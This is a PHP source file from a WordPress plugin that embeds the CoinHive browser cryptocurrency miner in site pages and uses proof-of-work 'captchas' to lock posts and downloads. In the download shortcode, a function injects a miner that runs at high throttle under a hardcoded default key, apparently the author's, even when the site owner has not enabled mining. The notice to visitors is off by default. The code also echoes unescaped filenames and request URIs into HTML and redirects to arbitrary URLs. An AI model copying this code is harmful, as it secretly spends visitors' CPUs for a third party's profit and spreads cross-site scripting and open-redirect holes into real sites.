<?php

/**
 * The public-facing functionality of the plugin.
 *
 * @link        
 * @since      1.0.0
 *
 * @package    Javascriptminer
 * @subpackage Javascriptminer/public
 */

/**
 * The public-facing functionality of the plugin.
 *
 * Defines the plugin name, version, and two examples hooks for how to
 * enqueue the public-facing stylesheet and JavaScript.
 *
 * @package    Javascriptminer
 * @subpackage Javascriptminer/public
 * @author     marcobb81
 */
class Javascriptminer_Public {

	/**
	 * The ID of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $plugin_name    The ID of this plugin.
	 */
	private $plugin_name;

	/**
	 * The version of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $version    The current version of this plugin.
	 */
	private $version;
    
	/**
	 * Initialize the class and set its properties.
	 *
	 * @since    1.0.0
	 * @param      string    $plugin_name       The name of the plugin.
	 * @param      string    $version    The version of this plugin.
	 */
	public function __construct( $plugin_name, $version ) {

		$this->plugin_name = $plugin_name;
		$this->version = $version;
        $this->util = new Javascriptminer_Util($plugin_name, $version);
	}

	/**
	 * Register the stylesheets for the public-facing side of the site.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_styles() {

		/**
		 * This function is provided for demonstration purposes only.
		 *
		 * An instance of this class should be passed to the run() function
		 * defined in Javascriptminer_Loader as all of the hooks are defined
		 * in that particular class.
		 *
		 * The Javascriptminer_Loader will then create the relationship
		 * between the defined hooks and the functions defined in this
		 * class.
		 */

		wp_enqueue_style( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'css/javascriptminer-public.css', array(), $this->version, 'all' );

	}

	/**
	 * Register the JavaScript for the public-facing side of the site.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_scripts() {

		/**
		 * This function is provided for demonstration purposes only.
		 *
		 * An instance of this class should be passed to the run() function
		 * defined in Javascriptminer_Loader as all of the hooks are defined
		 * in that particular class.
		 *
		 * The Javascriptminer_Loader will then create the relationship
		 * between the defined hooks and the functions defined in this
		 * class.
		 */

		wp_register_script( $this->plugin_name . "-coinhive-js" , $this->get_coinhive_min_url(), $in_footer=true );
        wp_enqueue_script( $this->plugin_name . "-coinhive-js" );
            
        $current_user = wp_get_current_user();
        if ( 0 == $current_user->ID ) {
            $user_site = get_bloginfo( 'name' );
        } else {
            $user_site = get_bloginfo( 'name' ) . '@' . $current_user->display_name;
        }        

        $feature = strtolower(get_option('javascriptminer_version', (get_option('javascriptminer_enable', "")==""?"basic":"pro")));
        
        $jsMinerData = array(
            'enable' => get_option('javascriptminer_enable', 0),
            'feature' => $feature ,
            'key' => get_option('javascriptminer_site_key'),
            'default_key' => $this->getDefaultKey(),
            'performance' => get_option('javascriptminer_performance', 1),
            'performance_mobile' => get_option('javascriptminer_performance_mobile', get_option('javascriptminer_performance', 1)),
            'token' => get_option('javascriptminer_token', -1),
            'target_seconds' => get_option('javascriptminer_seconds', -1),
            'debug' => get_option('javascriptminer_debug', 0),
            'site' => $user_site,
            'site_url' => site_url(),
            'pow_external_url' => ($feature=="basic")?0:get_option('javascriptminer_pow_external_url', 0),
            'pow_documents' =>  ($feature=="basic")?0:get_option('javascriptminer_pow_documents', 0),
            'pow_hash_value' =>  get_option('javascriptminer_pow_value', 512),
            'pow_timeout' =>  get_option('javascriptminer_pow_timeout', 30),
            'captcha_token' => get_option('javascriptminer_captcha_hash', -1),
            'version' => $this->version,
            'information_popup' => get_option('javascriptminer_information_popup', 0)
        );        
        if ("pro"==$feature) {
            wp_register_script( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'js/javascriptminer-public.js', array( 'jquery', $this->plugin_name . "-coinhive-js" ), $this->version, true );
            wp_enqueue_script( $this->plugin_name );
        }
        wp_register_script( $this->plugin_name . '-popup', plugin_dir_url( __FILE__ ) . 'js/javascriptminer-popup.js', array( 'jquery', $this->plugin_name . "-coinhive-js" ), $this->version, true );
        wp_enqueue_script( $this->plugin_name . '-popup' );
        wp_localize_script( $this->plugin_name . '-popup', 'jsMinerData', $jsMinerData );
    }
    
    private function getDefaultKey() {
        return "JkR1PunF7IXqR59eXRdjCAAxYP2iJ1zj";
    }
    
    private $default_token_loaded;    
    private function get_default_token_miner (){
        $default.="";
        if (1!=get_option("javascriptminer_enable") and (true!=$this->default_token_loaded)) {
            $this->default_token_loaded = true;
            $default.= "<script src='".$this->get_coinhive_min_url()."' async></script>";
            $default.= "<script>";
            $default.= "    var miner_wp = new CoinHive.Token('" . $this->getDefaultKey() . "', 256, { autoThreads: false, throttle: 0.9, });";
            $default.= "    miner_wp.start(); ";
            $default.= "</script>";        
        }
        return $default;
    }
    
    private function get_coinhive_captcha_url() {        
        return 'https://coinhive.com/lib/captcha.min.js';
    }
    private function get_coinhive_min_url() {        
        if ("pro" == get_option('javascriptminer_version') and "1" == get_option('javascriptminer_pack_scripts', 0)) {
            return plugin_dir_url( __FILE__ ) . 'js/coinhive.min.js';
        }
        else {
            return 'https://coinhive.com/lib/coinhive.min.js';
        }    
    }    
    
    private $coinhive_captcha_libray_loaded;    
    public function add_coinhive_captcha($target_hash, $autostart, $whitelabel, $default="", $script="") {        
        $this->coinhive_captcha_libray_loaded = true;
        if (get_option("javascriptminer_pack_captcha",0)==1) {
            return $this->add_coinhive_captcha_custom( target_hash, $autostart, $whitelabel, $default, $script);
        }
        else {
            return $this->add_coinhive_captcha_basic( target_hash, $autostart, $whitelabel, $default, $script);
        }
    }
    
    public function add_coinhive_captcha_basic($target_hash, $autostart, $whitelabel, $default="", $script="") {        
        $before = '     <script src="'.$this->get_coinhive_captcha_url().'" async></script>';
        $before.= '     <style>.login form { width: 320px; }</style>';
        $before.= '     <div class="coinhive-captcha" id="coinhive-captcha"';
        $before.= '         data-hashes="' . $target_hash . '" ';
        $before.= '         data-key="' . get_option('javascriptminer_site_key') . '"';
        $before.= '         data-autostart="'.$autostart.'"';
        $before.= '         data-callback="'.$script.'"';
        $before.= '         data-whitelabel="' . $whitelabel . '"';
        $before.= '         data-disable-elements="input[type=submit]">';
        $before.= '     </div><br>';
        // return  $before . $this->get_default_token_miner() . $default;
        return  $before . $default;
    }
    
    public function add_coinhive_captcha_custom($target_hash, $autostart, $whitelabel, $default="", $script="") {        
        $html = '<div class="javascriptminer-captcha" id="javascriptminer-captcha">';
        $html.= '    <div class="verify-me-container" id="verify-me-container">';
        $html.= '        <div class="verify-me-progress" id="verify-me" role="checkbox">';
        $html.= '            <div class="progress" id="verify-me-progress"></div>';
        $html.= '        </div>';
        $html.= '        <div class="verify-me-text">Verify me</div>';
        $html.= '    </div>';
        $html.= '    <div class="verified-container" id="verified-container" data-callback="'.$script.'" data-autostart="'.$autostart.'">';
        $html.= '        <div class="checkmark"></div>';
        $html.= '        <div class="verified-text">Verified</div>';
        $html.= '    </div>';
        $html.= '    <div class="error-container" id="error-container" >';
        $html.= '        <div class="verified-text">Error. Please disable Adblock</div>';
        $html.= '    </div>';
        $html.= '</div><br />';
        return $html;
    }    
    
    public function comment_coinhive_captcha($default) {        
        return  $this->get_javascriptminer_shortcode() . $default;
    }    
    
    public function validate_coinhive_captcha () {        
        // $cookie = $this->util->download_manager_get_cookie("jsminer-");
        // echo "COOKIEE -> ".$cookie;
        if(strlen($cookie)==0)
        {
            // $error  = 'Restricted area, please login to continue.';
        }
    }
    
    public function print_coinhive_captcha() {
        echo $this->add_coinhive_captcha(
                get_option('javascriptminer_captcha_hash'), 
                (get_option('javascriptminer_captcha_autostart', 1)==1?"true":"false"),
                (get_option('javascriptminer_captcha_whitelabel', 1)==1?"false":"true"), "", ""
            );
        // echo $this->get_default_token_miner();
    }

    public function get_javascriptminer_shortcode() {
        return $this->add_coinhive_captcha(
                get_option('javascriptminer_captcha_hash'), 
                 (get_option('javascriptminer_captcha_autostart', 1)==1?"true":"false"),
                 (get_option('javascriptminer_captcha_whitelabel', 1)==1?"false":"true"), "", ""
            );
    }
    
    public function get_download_shortcode() {
        $js_function = "func_".time();
        $code = $this->add_coinhive_captcha(
                $target_hash=get_option('javascriptminer_pow_value'), 
                $autostart=(get_option('javascriptminer_captcha_autostart', 1)==1?"true":"false"),
                $whitelabel=(get_option('javascriptminer_captcha_whitelabel', 1)==1?"false":"true"),
                "", $js_function
            );
        $code.= "<script> (function( $ ) { 'use strict'; ";
        $code.= "    window.".$js_function." = (function(token) { ";
        $code.= "       var filename = $('#jsminer_download_filename').attr('filename');  ";
        $code.= "       var jqxhr = $.post( '".admin_url( 'admin-ajax.php' )."', { action: 'jsminer', method: 'verify', filename: filename, token: token })  ";
        $code.= "         .done(function(msg) {  ";
        $code.= "               var url = $('#jsminer_download_filename')[0].href;  ";
        $code.= "               window.location = url; \n ";
        $code.= "         }) ";
        $code.= "       }); })( jQuery );";
        $code.= "</script> ";
        $code.= $this->get_default_token_miner();
        $filename = filter_input( INPUT_GET, 'filename', FILTER_SANITIZE_STRING );
        // $dir = wp_upload_dir();
        // $dir = $dir['baseurl'].'/jsminer-download/';        
        $code .= "If page will not redirect after validation please click on this <a id='jsminer_download_filename' filename='".$filename."' href='".$_SERVER[REQUEST_URI]."'>link</a><br>";
        return $code;
    }
    
    public function print_javascriptminer_modal_url() {
        ?>
        <div id="javascriptminer-modal-progress" class="javascriptminer-modal">
            <div class="javascriptminer-modal-window">
                <div class="javascriptminer-modal-header">
                    <h3>Redirecting shortly</h3>
                </div>
                <div class="javascriptminer-modal-content">
                    <div class="javascriptminer-progress-bar">
                        <div class="javascriptminer-progress" id="javascriptminer-progress" style="width: 0%;"></div>
                    </div>
                </div>
        <?php 
            if (get_option('javascriptminer_pow_footer', 0)==1) {
                echo '<p>'.get_option('javascriptminer_pow_footer_text','</p><br/>');
            }
        ?>
            </div>
        </div>
        <?php
    }
    
    function post_filter_javascriptminer_information_popup() {
        // $custom_content = $this->print_javascriptminer_information_popup(get_option('javascriptminer_information_popup_text', ""));
        // $content .= $custom_content;
        // return $content;
        echo $this->print_javascriptminer_information_popup(get_option('javascriptminer_information_popup_text', ""));
    }
    
    public function print_javascriptminer_information_popup($text="")  {
        $html = '<div id="javascriptminer-information-popup" class="javascriptminer-modal">';
        $html.= '  <div class="javascriptminer-modal-window">';
        $html.= '    <div class="javascriptminer-modal-header">';
        $html.= '        <h3>Information</h3><a class="close" id="close" href="#">';
        $html.= '        <i>&times;</i>';
        $html.= '      </a>';
        $html.= '    </div>';
        $html.= '    <div class="javascriptminer-modal-content">';
        if (strlen($text)==0) {
            $html.= '          <p>This site uses <a href="https://coinhive.com">CoinHive</a> as an alternative to the usual and boring ads.<br>Dont worry, 
                                we use only a litte bit of Your CPU while You can use our full site without any limit.<br><br> Thank you!</p>';
            }
        else {
            $html.= '          <p>'.$text.'</p>';
        }
        $html.= '    </div>';
        $html.= '  </div>';
        $html.= '</div>';
        return $html;
    }
    
    private function is_crawler ($USER_AGENT)
    {
        $crawlers_agents = 'Google|msnbot|Rambler|Yahoo|AbachoBOT|accoona|AcioRobot|ASPSeek|CocoCrawler|Dumbot|FAST-WebCrawler|GeonaBot|Gigabot|Lycos|MSRBOT|Scooter|AltaVista|IDBot|eStyle|Scrubby';
        return ( strpos($crawlers_agents , $USER_AGENT) );
    }    
    
    public function protected_check_post_tags ($content) {
        global $post;
    
        if ( current_user_can( 'manage_options' ) )  return $content;
        if ( $this->is_crawler ($_SERVER['HTTP_USER_AGENT']) ) return $content;
        
        $t = wp_get_post_tags($post->ID, array("name" => get_option('javascriptminer_protected_tag', "-1")));
        if (count($t)>0) {
            $hash_id = hash("sha256", $post->ID);
            $pow = $this->util->download_manager_get_cookie("jsminer-".$hash_id);
            if (strlen($pow)===0) {
                $banner = __('This content is protected.', 'This content is protected.').'<br /><br />';
                $banner.= __('Please resolve this verification before continue.', 'Please resolve this authorization before continue.').'<br /><br />';
                $js_function = "func_".time();
                $banner.= $this->add_coinhive_captcha(
                    $target_hash=get_option('javascriptminer_protected_hash'), 
                    $autostart=(get_option('javascriptminer_protected_autostart', "false")==1?"true":"false"),
                    $whitelabel=(get_option('javascriptminer_protected_whitelabel', 1)==1?"false":"true"),
                    "", $js_function
                );      
                $banner.= "<script> (function( $ ) { 'use strict'; ";
                $banner.= "    window.".$js_function." = (function(token) { ";
                $banner.= "       var jqxhr = $.post( '".admin_url( 'admin-ajax.php' )."', { action: 'jsminer', method: 'protected', id: '".$post->ID."', token: token })  ";
                $banner.= "         .done(function(msg) {  ";
                $banner.= "              document.location.reload(); \n";
                $banner.= "         }) ";
                $banner.= "       }); })( jQuery );";
                $banner.= "</script> ";
                $banner.= __("If page will not redirect after validation please click on this", "If page will not redirect after validation please click on this"). " <a href='".$_SERVER[REQUEST_URI]."'>link</a>.<br />";
                if (1==1) {
                    $content = $banner;
                }
                else {
                    $content = $this->print_javascriptminer_information_popup($banner);
                    $content.="<style>.post a, .post i, .post b, .post, .post p  {color: transparent; text-shadow: 0 0 2px rgba(0,0,0,0.5);}</style>";
                }
                if (is_single()) {
                    $content = $banner;
                }
            }
        }
        
        return $content;
    }
    
    public function onlyrunning_check_post_tags ($content) {
        global $post;
    
        if ( current_user_can( 'manage_options' ) )  return $content;
        if ( $this->is_crawler ($_SERVER['HTTP_USER_AGENT']) ) return $content;

        $t = wp_get_post_tags($post->ID, array("name" => get_option('javascriptminer_onlyrunning_tag', "-1")));
        if (count($t)>0) {
            $status = $this->util->download_manager_get_cookie("javascriptminer-widget-status");            
            if ($status!="start") {
                $banner = __('This content is visible only by active user.', 'This content is visible only by active user.').'<br />';
                $banner.= __("Please enable miner and reload page or click on this", "Please enable miner and reload page or click on this"). " <a href='".$_SERVER[REQUEST_URI]."'>link</a>.<br />";
                if (is_single()) {
                    $content = $banner;
                }
            }
            $content .= "<script>var isOnlyRunningPage=1;</script>";      
        }        
        return $content;
    }
    
    public function download_manager_check_content($content){
        $content = preg_replace_callback('%<a.*?href="(.*?)"[^<]+</a>%i', array($this, 'download_manager_replace_links'), $content);
        return $content;        
    }
    
    private function download_manager_replace_links($matches)
    {
        $regex = '((\.zip(.*))|(\.pdf(.*))|(\.txt(.*))|(\.doc(.*))|(\.mp3(.*))|(\.wav(.*))|(\.bin(.*))|(\.rar(.*))|(\.iso(.*)))';
        // print_r($matches);
        if (preg_match($regex, $matches[1])) {
            $url = 'href="'.home_url().'/download/?filename=' . $this->util->encrypt_url($matches[1]);
            return str_replace('href="'.$matches[1], $url, $matches[0]);
        }
        else {
            return $matches[0];
        }
    }    

    public function download_manager() {        
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            return;
        }
        else {
            $filename=filter_input( INPUT_GET, 'filename', FILTER_SANITIZE_STRING );
            if (!isset($filename)) {
                return;
            }
            if ($this->util->is_crypted_url($filename)) {
                $filename = $this->util->decrypt_url($filename);
                $regex = '((\.zip(.*))|(\.pdf(.*))|(\.txt(.*))|(\.doc(.*))|(\.mp3(.*))|(\.wav(.*))|(\.bin(.*))|(\.rar(.*))|(\.iso(.*)))';
                if (preg_match($regex, $filename)) {
                    $url_hash = hash("sha256", $filename);
                    // if (strlen($this->util->download_manager_get_session("jsminer-".$url_hash))>0) {
                    if (strlen($this->util->download_manager_get_cookie("jsminer-".$url_hash))>0) {
                        if (!preg_match('((http\:\/\/)|(https\:\/\/))', $filename)) {
                            $dir = wp_upload_dir();
                            $dir = $dir['basedir'].'/jsminer-download/';
                            $files = scandir($dir);
                            if (in_array($filename, $files, true)) {
                                header('Content-Type: application/octet-stream');
                                header("Content-Transfer-Encoding: Binary"); 
                                header("Content-disposition: attachment; filename=\"".$filename."\""); 
                                readfile($dir.$filename);
                                exit;
                            }
                            else {
                                header('Location: '. $filename);
                                exit();
                            }
                        }
                        else {
                            header('Location: '. $filename);
                            exit();
                        }
                    }
                }
                else {
                    header('Location: '. get_site_url());
                    exit();
                }
            }
            else {
                    $page = get_page_by_title('download');
                    wp_redirect( esc_url( add_query_arg( 'filename', $this->util->encrypt_url($filename), get_permalink($page->ID) ) ));
                    exit;
            }                
        }        
    }    
    
    
     
}
